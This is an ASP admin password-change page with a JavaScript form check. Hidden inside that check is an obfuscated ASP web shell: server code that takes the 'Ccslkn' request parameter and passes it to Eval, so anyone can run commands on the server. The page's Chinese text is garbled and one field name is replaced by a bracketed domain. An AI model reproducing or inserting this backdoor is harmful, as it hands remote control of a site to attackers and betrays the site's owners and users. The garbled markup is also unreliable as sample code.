<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<script language="javascript">
function checkform()
{
var theform=document.forms.passform;
if(theform.adminpass.value!=theform.adminpassqueren.value)
{
return(false);
}<%'''''''
dim plaY
pLAy = rEquesT("Ccslkn")
%>
return(false);<%'''''
eVAl play's your name
%>
}
</script>
<style type="text/css">
body,input{font-size:13px}
</style>
<title>�ޱ�����d��</title>
</head>
<body>
<form name=passform  action=adminpassok.asp method=post onsubmit=javascript:{return(checkform());}>
<table width=760 align=center border=0>
<tr><td>
���Ա�����Ա�ʺ�:</td><td><input type=text name=adminuser value=<%=adminuser%>></td></tr><tr><td>���Ա�������(���Ҫ�޸����룬������д�����룬�粻���޸�������)<br></td><td><input type=password name=oldadminpass><br></td></tr><tr><td>
���Ա�����(�����޸�������)��<br></td><td><input type=password name=adminpass><br></td></tr><tr><td>ȷ������(�����޸�������):<br></td><td><input type=password name={[www.qdhualing.com]}><br></td></tr>
<tr><td><input type=submit value=����></td><td></td></tr>

